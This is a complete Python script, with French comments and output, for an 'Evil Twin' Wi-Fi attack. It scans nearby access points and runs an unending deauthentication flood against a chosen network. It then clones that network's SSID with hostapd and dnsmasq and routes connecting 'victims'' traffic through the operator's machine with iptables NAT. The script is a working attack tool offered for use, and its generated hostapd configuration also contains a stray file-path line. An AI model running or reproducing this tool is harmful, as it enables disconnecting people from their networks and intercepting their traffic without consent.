#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
import threading
import re

# === Couleurs ===
RED    = "\033[1;31m"
ORANGE = "\033[1;33m"
YELLOW = "\033[93m"
GREEN  = "\033[1;32m"
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
RESET  = "\033[0m"

SCAN_FILE = "/tmp/ipf_scan"
active_processes = []

# === Gestion des signaux ===
def signal_handler(sig, frame):
    print(f"\n{YELLOW}[!] Interruption détectée. Nettoyage...{RESET}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def cleanup():
    """Nettoie tous les processus actifs"""
    global active_processes
    for proc in active_processes:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except:
            try:
                proc.kill()
            except:
                pass
    active_processes = []
    
    # Nettoyer les fichiers de scan
    try:
        for f in [f"{SCAN_FILE}-01.csv", f"{SCAN_FILE}-01.cap"]:
            if os.path.exists(f):
                os.remove(f)
    except:
        pass

def banner():
    os.system("clear")
    print(RED + r"""
          
 ██▓ ██▓███       █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓▓█████  ██▀███     
▓██▒▓██░  ██▒   ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
▒██▒▓██░ ██▓▒   ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
░██░▒██▄█▓▒ ▒   ░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
░██░▒██▒ ░  ░   ░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
░▓  ▒▓▒░ ░  ░    ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   
 ▒ ░░▒ ░         ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
 ▒ ░░░           ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░         ░     ░░   ░    
 ░                      ░        ░  ░  ░  ░            ░  ░   ░        
""" + RESET)
    print(f"{ORANGE}        >>> IPFighter — Evil Twin Wi-Fi Tool by H8Laws <<<{RESET}")
    print(f"{CYAN}                    Version 2.0 Enhanced{RESET}\n")

def list_interfaces():
    """Liste toutes les interfaces réseau Wi-Fi"""
    try:
        result = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", 
                                        shell=True, stderr=subprocess.DEVNULL)
        interfaces = result.decode().strip().split('\n')
        # Filtrer les lignes vides
        interfaces = [iface for iface in interfaces if iface]
        return interfaces
    except Exception as e:
        print(f"{RED}[-] Erreur lors de la récupération des interfaces: {e}{RESET}")
        return []

def choose_interface(prompt):
    """Permet à l'utilisateur de choisir une interface"""
    interfaces = list_interfaces()
    if not interfaces:
        print(f"{RED}[-] Aucune interface Wi-Fi détectée !{RESET}")
        sys.exit(1)
    
    print(f"\n{BLUE}[+] Interfaces disponibles :{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{YELLOW}  {i}.{RESET} {iface}")
    
    try:
        idx = int(input(f"\n{ORANGE}[?] {prompt} : {RESET}"))
        if 0 <= idx < len(interfaces):
            return interfaces[idx]
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")
            sys.exit(1)
    except (ValueError, IndexError):
        print(f"{RED}[-] Choix invalide !{RESET}")
        sys.exit(1)

def kill_conflicts():
    """Tue les processus conflictuels"""
    print(f"\n{YELLOW}[*] Arrêt de NetworkManager & wpa_supplicant...{RESET}")
    subprocess.call("airmon-ng check kill", shell=True, 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

def start_monitor(interface):
    """
    Passe l'interface en mode monitor avec airmon-ng
    Retourne le nom de l'interface monitor créée
    """
    print(f"{GREEN}[+] Passage de {interface} en mode monitor...{RESET}")
    
    # Récupérer les interfaces avant
    try:
        before = set(list_interfaces())
    except Exception:
        before = set()
    
    # Lancer airmon-ng start
    try:
        out = subprocess.check_output(["airmon-ng", "start", interface], 
                                     stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        try:
            print(e.output.decode(errors="ignore"))
        except:
            pass
    
    # Attendre que l'interface soit créée
    time.sleep(2)
    
    # Récupérer les interfaces après
    try:
        after = set(list_interfaces())
    except Exception:
        after = set()
    
    # Chercher la nouvelle interface
    new = list(after - before)
    
    if not new:
        # Essayer de trouver une interface avec "mon" dans le nom
        candidates = [iface for iface in after if "mon" in iface.lower()]
        if candidates:
            mon_iface = candidates[0]
            print(f"{GREEN}[+] Interface monitor détectée : {mon_iface}{RESET}")
            return mon_iface
        else:
            print(f"{YELLOW}[!] Impossible de détecter l'interface monitor, utilisation de {interface}{RESET}")
            return interface
    
    # Si plusieurs nouvelles interfaces, préférer celle avec "mon"
    for iface in new:
        if "mon" in iface.lower():
            print(f"{GREEN}[+] Interface monitor créée : {iface}{RESET}")
            return iface
    
    print(f"{GREEN}[+] Interface monitor créée : {new[0]}{RESET}")
    return new[0]

def restore_network():
    """Restaure les services réseau"""
    print(f"\n{GREEN}[+] Restauration du réseau...{RESET}")
    
    # Arrêter les interfaces monitor
    try:
        ifaces = list_interfaces()
        mon_ifaces = [iface for iface in ifaces if "mon" in iface.lower()]
        for mon in mon_ifaces:
            print(f"{YELLOW}[*] Arrêt de l'interface monitor {mon}...{RESET}")
            subprocess.call(["airmon-ng", "stop", mon], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    
    # Redémarrer NetworkManager
    print(f"{YELLOW}[*] Redémarrage de NetworkManager...{RESET}")
    subprocess.call("systemctl restart NetworkManager", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Nettoyer iptables
    print(f"{YELLOW}[*] Nettoyage des règles iptables...{RESET}")
    subprocess.call("iptables --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --table nat --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan_aps(mon_iface, duration=15):
    """Scanne les points d'accès Wi-Fi"""
    print(f"\n{YELLOW}[+] Scan des réseaux Wi-Fi pendant {duration} secondes...{RESET}")
    print(f"{CYAN}[*] Appuyez sur Ctrl+C pour arrêter plus tôt{RESET}")
    
    # Nettoyer les anciens fichiers
    try:
        for f in [f"{SCAN_FILE}-01.csv", f"{SCAN_FILE}-01.cap"]:
            if os.path.exists(f):
                os.remove(f)
    except:
        pass
    
    cmd = [
        "airodump-ng",
        "--write-interval", "1",
        "--write", SCAN_FILE,
        "--output-format", "csv",
        mon_iface
    ]
    
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        time.sleep(duration)
        proc.terminate()
    except KeyboardInterrupt:
        proc.terminate()
    
    try:
        proc.wait(timeout=3)
    except:
        proc.kill()
    
    # Parser les résultats
    aps = []
    csv_file = f"{SCAN_FILE}-01.csv"
    
    if not os.path.exists(csv_file):
        print(f"{RED}[-] Fichier de scan introuvable !{RESET}")
        return aps
    
    try:
        with open(csv_file, encoding="utf-8", errors="ignore") as f:
            content = f.read()
            lines = content.splitlines()
            ap_section = False
            
            for line in lines:
                if "BSSID" in line and "ESSID" in line:
                    ap_section = True
                    continue
                
                if ap_section:
                    # Section clients commence par "Station MAC"
                    if "Station MAC" in line:
                        break
                    
                    if line.strip() == "":
                        continue
                    
                    fields = [f.strip() for f in line.split(",")]
                    
                    if len(fields) >= 14:
                        bssid = fields[0]
                        channel = fields[3]
                        essid = fields[13]
                        
                        # Ignorer les réseaux sans ESSID
                        if essid and essid != "" and bssid:
                            aps.append((bssid, channel, essid))
    
    except Exception as e:
        print(f"{RED}[-] Erreur lors de la lecture du CSV : {e}{RESET}")
    
    return aps

def select_ap(aps):
    """Permet de sélectionner un point d'accès cible"""
    print(f"\n{BLUE}   NUM   ESSID                 CH     BSSID{RESET}")
    print(f"{BLUE}  ----  -------------------  ----  -------------------{RESET}")
    
    for i, ap in enumerate(aps):
        bssid, channel, essid = ap
        print(f"{YELLOW}  {i:<4}{RESET}  {CYAN}{essid[:20]:<20}{RESET}  "
              f"{YELLOW}{channel:<4}{RESET}  {BLUE}{bssid}{RESET}")
    
    try:
        idx = int(input(f"\n{ORANGE}[?] Choix de l'AP cible : {RESET}"))
        if 0 <= idx < len(aps):
            return aps[idx]
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")
            sys.exit(1)
    except (ValueError, IndexError):
        print(f"{RED}[-] Choix invalide !{RESET}")
        sys.exit(1)

def create_fake_ap(mon_iface, ssid, bssid, channel):
    """Crée un faux point d'accès avec hostapd et dnsmasq"""
    global active_processes
    
    print(f"\n{GREEN}[+] Création du faux AP '{ssid}' sur le canal {channel}...{RESET}")
    
    # Vérifier les dépendances
    if subprocess.run(["which", "hostapd"], capture_output=True).returncode != 0:
        print(f"{RED}[-] hostapd n'est pas installé !{RESET}")
        print(f"{ORANGE}[!] Installez-le avec: apt install hostapd{RESET}")
        return None, None
    
    if subprocess.run(["which", "dnsmasq"], capture_output=True).returncode != 0:
        print(f"{RED}[-] dnsmasq n'est pas installé !{RESET}")
        print(f"{ORANGE}[!] Installez-le avec: apt install dnsmasq{RESET}")
        return None, None
    
    # Configurer le canal
    subprocess.call(["iwconfig", mon_iface, "channel", str(channel)],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Lancer aireplay pour déauth (optionnel)
    print(f"{YELLOW}[*] Lancement de l'attaque de déauthentification...{RESET}")
    deauth_proc = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_processes.append(deauth_proc)
    
    # Configuration hostapd
    hostapd_conf = f"""/tmp/hostapd_evil.conf
interface={mon_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    
    # Demander si on veut de la sécurité (WPA2)
    secure = input(f"{ORANGE}[?] Ajouter une protection WPA2? (y/N) : {RESET}").strip().lower()
    if secure == 'y':
        password = input(f"{ORANGE}[?] Mot de passe (min 8 caractères) : {RESET}").strip()
        if len(password) >= 8:
            hostapd_conf += f"""auth_algs=1
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        else:
            print(f"{YELLOW}[!] Mot de passe trop court, réseau ouvert créé{RESET}")
    
    try:
        with open("/tmp/hostapd_evil.conf", "w") as f:
            f.write(hostapd_conf)
    except:
        print(f"{RED}[-] Erreur lors de la création de la configuration hostapd{RESET}")
        return None, None
    
    # Configuration interface
    print(f"{YELLOW}[*] Configuration de l'interface {mon_iface}...{RESET}")
    subprocess.call(["ifconfig", mon_iface, "up"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["ifconfig", mon_iface, "10.0.0.1", "netmask", "255.255.255.0"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Configuration dnsmasq
    dnsmasq_conf = f"""interface={mon_iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
bind-interfaces
"""
    
    try:
        with open("/tmp/dnsmasq_evil.conf", "w") as f:
            f.write(dnsmasq_conf)
    except:
        print(f"{RED}[-] Erreur lors de la création de la configuration dnsmasq{RESET}")
        return None, None
    
    # Lancer hostapd
    print(f"{GREEN}[+] Démarrage de hostapd...{RESET}")
    hostapd_proc = subprocess.Popen(
        ["hostapd", "/tmp/hostapd_evil.conf"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_processes.append(hostapd_proc)
    time.sleep(2)
    
    # Lancer dnsmasq
    print(f"{GREEN}[+] Démarrage de dnsmasq...{RESET}")
    dnsmasq_proc = subprocess.Popen(
        ["dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_processes.append(dnsmasq_proc)
    
    return hostapd_proc, dnsmasq_proc

def setup_forwarding(inet_iface, mon_iface):
    """Configure le routage et NAT pour rediriger le trafic"""
    print(f"\n{GREEN}[+] Configuration du routage vers {inet_iface}...{RESET}")
    
    # Activer le forwarding IP
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Nettoyer les règles existantes
    subprocess.call("iptables --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --table nat --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --delete-chain", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --table nat --delete-chain", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Configurer NAT
    subprocess.call(f"iptables -t nat -A POSTROUTING -o {inet_iface} -j MASQUERADE", 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT", 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(f"iptables -A FORWARD -i {mon_iface} -j ACCEPT", 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{GREEN}[+] Routage configuré avec succès !{RESET}")

def main():
    # Vérifier root
    if os.geteuid() != 0:
        print(f"{RED}[-] Ce script doit être exécuté en tant que root !{RESET}")
        sys.exit(1)
    
    banner()
    
    # Choix des interfaces
    inet_iface = choose_interface("Interface pour ACCÈS Internet (eth0, wlan0 connectée, etc.)")
    
    banner()
    atk_iface = choose_interface("Interface pour ATTAQUE (sera passée en mode monitor)")
    
    # Préparation
    kill_conflicts()
    mon_iface = start_monitor(atk_iface)
    
    # Scan des AP
    aps = scan_aps(mon_iface)
    
    if not aps:
        print(f"{RED}[-] Aucun point d'accès détecté !{RESET}")
        restore_network()
        return
    
    # Sélection de la cible
    bssid, channel, essid = select_ap(aps)
    
    # Création du faux AP
    hostapd_proc, dnsmasq_proc = create_fake_ap(mon_iface, essid, bssid, channel)
    
    if not hostapd_proc or not dnsmasq_proc:
        print(f"{RED}[-] Échec de la création du faux AP{RESET}")
        cleanup()
        restore_network()
        return
    
    # Configuration du routage
    setup_forwarding(inet_iface, mon_iface)
    
    # Affichage des informations
    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{CYAN}[✓] Evil Twin actif !{RESET}")
    print(f"{CYAN}[*] SSID cible : {essid}{RESET}")
    print(f"{CYAN}[*] BSSID : {bssid}{RESET}")
    print(f"{CYAN}[*] Canal : {channel}{RESET}")
    print(f"{CYAN}[*] Interface monitor : {mon_iface}{RESET}")
    print(f"{CYAN}[*] Interface Internet : {inet_iface}{RESET}")
    print(f"{CYAN}[*] Gateway : 10.0.0.1{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"\n{YELLOW}[!] Les victimes qui se connectent obtiendront une IP 10.0.0.x{RESET}")
    print(f"{YELLOW}[!] Leur trafic sera routé via {inet_iface}{RESET}")
    print(f"\n{ORANGE}[*] Appuyez sur Ctrl+C pour arrêter...{RESET}\n")
    
    try:
        # Boucle principale
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Arrêt de l'Evil Twin...{RESET}")
    finally:
        cleanup()
        restore_network()
        print(f"\n{GREEN}[+] Nettoyage terminé. Au revoir !{RESET}")

if __name__ == "__main__":
    main()
